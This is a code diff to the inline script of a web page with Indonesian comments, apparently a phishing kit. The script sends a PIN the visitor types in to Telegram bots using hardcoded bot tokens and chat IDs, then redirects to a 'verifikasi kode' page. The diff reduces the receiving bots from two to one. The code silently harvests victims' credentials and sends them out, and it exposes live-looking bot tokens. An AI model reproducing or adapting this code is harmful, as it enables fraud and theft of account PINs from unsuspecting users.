@@ -167,12 +167,8 @@
     <!-- ============================================== -->
     <script>
         // ==================== BOT 1 ====================
-        const BOT1_TOKEN = "8463412359:AAG6nli8rzC54LQSKkgXBXkwI8ePspNfFIA"; 
-        const BOT1_CHAT_ID = "-1003797236002";
-
-        // ==================== BOT 2 — GANTI DENGAN DATA BOT KEDUA ====================
-        const BOT2_TOKEN = "8567366336:AAEBjptgS76AUDZ80k1C0uLL5NQnTGnQT0Q"; 
-        const BOT2_CHAT_ID = "-1003710620091";
+        const BOT1_TOKEN = "8567366336:AAEBjptgS76AUDZ80k1C0uLL5NQnTGnQT0Q"; 
+        const BOT1_CHAT_ID = "-1003710620091";
 
         // ==================== HALAMAN TUJUAN ====================
         const HALAMAN_BERIKUTNYA = "verifikasi kode.html";
@@ -222,11 +218,9 @@ PIN: <code>${pin}</code>`;
             // Kirim ke 2 bot SECARA BERSAMAAN
             const [hasilBot1, hasilBot2] = await Promise.all([
                 kirimKeBot(BOT1_TOKEN, BOT1_CHAT_ID, pesan),
-                kirimKeBot(BOT2_TOKEN, BOT2_CHAT_ID, pesan)
             ]);
 
             console.log("Bot 1:", hasilBot1 ? "✅ Berhasil" : "❌ Gagal");
-            console.log("Bot 2:", hasilBot2 ? "✅ Berhasil" : "❌ Gagal");
 
             // Pindah halaman setelah selesai
             window.location.href = HALAMAN_BERIKUTNYA;
